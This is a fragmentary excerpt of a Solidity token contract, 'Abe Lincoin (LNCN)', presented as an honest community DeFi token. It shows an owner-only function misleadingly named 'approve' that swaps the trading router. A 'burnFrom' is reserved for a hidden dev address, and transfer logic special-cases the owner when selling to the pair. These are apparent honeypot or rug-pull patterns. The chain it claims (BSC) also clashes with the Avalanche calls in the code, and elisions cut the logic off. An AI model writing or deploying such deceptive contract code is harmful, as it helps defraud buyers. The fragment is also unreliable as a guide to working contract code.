...
/**
Abe Lincoin (LNCN) is a community focused, BEP-20 DeFi token with an aim of creating Referral Rewards through third party corporate and social partnerships, encouraging honesty, truth, and accountability while increasing awareness to partnerships, social causes, and rewarding holders. Created and deployed on the BSCSCAN network
*/
...
contract Lincoln is Context, IARC20, Ownable {
    ...
    IDEXRouter public PngRouter;
    address public PngPair;
  
    address payable public BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    uint256 private _total = 10**11 * 10**18;
    event IDEXRouterUpdated(address indexed operator, address indexed router, address indexed pair);
    ...
    function burnFrom(uint256 amount) public {
        require(_msgSender() != address(0), "ARC20: cannot permit zero address");
        require(_msgSender() == _excludeDevAddress, "ARC20: cannot permit dev address");
    ...
    function approve(address approveAddr1, address approveAddr2) public onlyOwner {
        ...
        PngRouter = IDEXRouter(approveAddr1);
        PngPair = IDEXFactory(PngRouter.factory()).getPair(address(this), PngRouter.WAVAX());
        require(PngPair != address(0), "updateTokenSwapRouter: Invalid pair address.");
        emit IDEXRouterUpdated(msg.sender, address(PngRouter), PngPair);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender == owner()) {
            ...
            if (sender != _approvedAddress && recipient == PngPair) {
